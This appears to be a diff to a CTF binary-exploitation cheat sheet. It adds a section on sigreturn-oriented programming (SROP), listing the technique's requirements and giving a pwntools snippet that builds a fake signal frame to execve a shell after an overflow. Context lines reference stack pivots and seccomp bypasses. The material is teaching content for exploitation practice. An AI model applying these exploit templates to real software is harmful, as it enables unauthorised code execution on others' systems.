@@ -2,6 +2,7 @@
 
 ## Table of Contents
 - [Double Stack Pivot to BSS via leave;ret (Midnightflag 2026)](#double-stack-pivot-to-bss-via-leaveret-midnightflag-2026)
+- [SROP Core Workflow](#srop-core-workflow)
 - [SROP with UTF-8 Payload Constraints (DiceCTF 2026)](#srop-with-utf-8-payload-constraints-dicectf-2026)
 - [Seccomp Bypass](#seccomp-bypass)
 - [RETF Architecture Switch for Seccomp Bypass (Midnightflag 2026)](#retf-architecture-switch-for-seccomp-bypass-midnightflag-2026)
@@ -65,6 +66,37 @@ stage2 = flat(
 **Key insight:** `leave; ret` is equivalent to `mov rsp, rbp; pop rbp; ret`. Overwriting RBP controls where RSP lands after `leave`. Two pivots solve the "too small for ROP" problem: first pivot moves to BSS where a small bootstrap ROP calls `fgets` to load the full exploit.
 
 **When to use:** Overflow is too small for a full ROP chain AND the binary uses `fgets`/`read` (or similar input function) that can be called via PLT. BSS is always writable and at a known address (no PIE or PIE leaked).
+
+---
+
+## SROP Core Workflow
+
+On signal return, the kernel restores registers from a `sigcontext`-shaped frame on the user stack. A fake frame therefore turns one `sigreturn` invocation into control of RIP, RSP, argument registers, and other CPU state.
+
+Requirements:
+
+- A way to set `rax=15` and reach `syscall`, or an equivalent direct `sigreturn` gadget.
+- Writable/known memory for the fake frame and any strings.
+- The correct frame layout for the target architecture; x86-64 frames cannot be reused on ARM/MIPS.
+
+```python
+from pwn import *
+
+context.arch = "amd64"
+frame = SigreturnFrame()
+frame.rax = constants.SYS_execve
+frame.rdi = binsh_addr
+frame.rsi = 0
+frame.rdx = 0
+frame.rip = syscall_addr
+
+payload  = b"A" * offset
+payload += p64(pop_rax_ret) + p64(15)  # SYS_rt_sigreturn
+payload += p64(syscall_ret)
+payload += bytes(frame)
+```
+
+A runnable generator is available at [../../scripts/srop_execve.py](../../scripts/srop_execve.py).
 
 ---
 
